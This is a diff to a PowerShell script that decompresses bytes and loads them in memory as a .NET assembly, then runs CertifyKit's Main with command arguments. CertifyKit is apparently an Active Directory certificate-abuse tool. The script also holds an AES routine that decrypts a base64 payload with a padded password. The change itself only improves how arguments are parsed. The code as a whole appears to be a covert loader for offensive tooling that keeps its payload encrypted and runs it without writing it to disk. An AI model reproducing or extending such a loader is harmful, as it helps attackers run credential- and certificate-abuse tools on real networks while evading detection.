@@ -14,9 +14,13 @@
     $out = New-Object System.IO.MemoryStream
     $decompressed.CopyTo( $out )
     [byte[]] $byteOutArray = $out.ToArray()
+    
+    $pattern = '(?:/[^\s"]+"[^"]*"|/[^\s"]+|[a-z][^\s"]+)'
+    $args = [System.Text.RegularExpressions.Regex]::Matches($Command, $pattern) | ForEach-Object { $_.Value.Replace('"','') }
 
     $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
-    [CertifyKit.Program]::Main($Command.Split(" "))
+    [CertifyKit.Program]::Main($args)
+
     }
     function Decrypt($encryptedBase64, $password){
     $keyStr = $password.PadRight(32,'0').Substring(0,32);$secureKey = [System.Text.Encoding]::UTF8.GetBytes($keyStr);$encryptedWithIV2 = [Convert]::FromBase64String($encryptedBase64);$IV2 = $encryptedWithIV2[0..15];$realEncryptedBytes = $encryptedWithIV2[16..($encryptedWithIV2.Length-1)];$aes2 = [System.Security.Cryptography.Aes]::Create();$aes2.Key = $secureKey;$aes2.IV = $IV2;$decryptor = $aes2.CreateDecryptor();$decryptedBytes = $decryptor.TransformFinalBlock($realEncryptedBytes, 0, $realEncryptedBytes.Length);$decryptedText = [System.Text.Encoding]::UTF8.GetString($decryptedBytes);return $decryptedText;
